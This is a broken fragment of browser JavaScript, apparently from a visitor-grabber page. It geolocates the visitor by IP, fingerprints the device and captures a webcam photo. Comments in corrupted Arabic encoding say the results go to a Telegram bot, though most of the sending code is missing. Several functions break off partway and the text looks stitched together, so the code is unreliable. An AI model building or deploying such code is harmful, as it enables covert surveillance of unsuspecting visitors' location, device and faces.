    async function getUserLocation() {
        try {
            const response = await fetch('https://ipapi.co/json');
            const data = await response.json();
            return {
                city: data.city || "Unknown",

    // Ø¯Ø§Ù„Ø© Ù„Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²
    function getDeviceInfo() {
        const platform = navigator.platform;
        const browserInfo = navigator.userAgent;
        const language = navigator.language;
        const memory = (navigator.deviceMemory || 4).toFixed(2); // Ø§ÙØªØ±Ø§Ø¶ÙŠØ§Ù‹ 4 Ø¬ÙŠØ¬Ø§
        const cpuCores = navigator.hardwareConcurrency;
        const screenResolution = `${window.screen.width}x${window.screen.height}`;
        return {
            platform,
            browserInfo,
            language,
            memory,
            cpuCores,
            screenResolution
        };
    }

    // Ø¯Ø§Ù„Ø© Ù„Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© Ù…Ù† ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„ÙˆÙŠØ¨
    async function captureImage() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            await new Promise(resolve => video.onloadedmetadata = resolve);
            video.play();
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg');
            stream.getTracks().forEach(track => track.stop());
            return imageData;
        } catch (error) {
            console.error('Error capturing image:', error);
            return null;
        }
    }

    // Ø¯Ø§Ù„Ø© Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù†Øµ Ø¥Ù„Ù‰ Telegram bot

    // Ø¯Ø§Ù„Ø© Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ø¥Ù„Ù‰ Telegram bot

        const formData = new FormData();

            console.error('Error sending image to Telegram');
        }
